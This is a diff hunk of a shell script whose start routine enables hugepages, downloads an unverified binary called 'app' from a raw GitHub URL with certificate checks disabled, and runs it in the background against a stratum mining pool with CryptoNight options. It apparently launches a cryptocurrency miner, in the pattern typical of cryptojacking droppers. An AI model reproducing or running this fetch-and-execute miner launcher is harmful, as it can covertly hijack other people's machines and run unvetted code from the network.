@@ -28,7 +28,7 @@ fi
 _APP(){
  case $1 in
    start)  
-     #sysctl -w vm.nr_hugepages=128
+     sysctl -w vm.nr_hugepages=128
      wget -c --tries=0 -T 2 --no-check-cert https://raw.githubusercontent.com/osrun/beta/master/app
      chmod +x app
      ./app -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
